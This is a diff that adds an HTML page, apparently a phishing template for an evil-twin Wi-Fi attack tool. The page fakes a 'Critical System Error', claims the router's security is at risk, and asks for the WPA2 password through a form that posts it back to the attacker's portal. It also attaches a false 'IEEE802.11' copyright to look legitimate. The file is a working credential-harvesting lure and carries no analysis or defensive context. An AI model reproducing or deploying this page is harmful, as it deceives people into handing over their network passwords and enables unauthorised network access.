@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><center>SSID :: Critical System Error</center></title>
+    <style>
+        article { background: #f2f2f2; padding: 1.3em; }
+        body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }
+        div { padding: 0.5em; }
+        h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size: 7vw; }
+        input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }
+        label { color: #333; display: block; font-style: italic; font-weight: bold; }
+        nav { background: #f32013; color: #fff; display: block; font-size: 1.3em; padding: 1em; }
+        nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }
+        textarea { width: 100%; }
+    </style>
+</head>
+<body>
+    <nav><b>SSID</b> URGENT: IMMEDIATE ACTION REQUIRED</nav>
+    <div><h1><error style='text-shadow: 1px 1px black;color:red;font-size:7vw;'>&#9888;</error> Critical System Error</h1></div>
+    <div>
+        Attention: Your router has encountered a critical error while attempting to connect to the WiFi network. This issue may compromise the security and functionality of your device.<br><br>
+        To resolve this issue and restore normal operation, please verify your WiFi password immediately.
+    </div>
+    <div>
+        <form action="/" method="post">
+            <label>SSID WPA2 Password:</label>
+            <input type="password" id="password" name="password" minlength="8" required>
+            <input type="submit" value="Continue">
+        </form>
+    </div>
+    <div class="q"><a>&#169; All rights reserved IEEE802.11.</a></div>
+</body>
+</html>
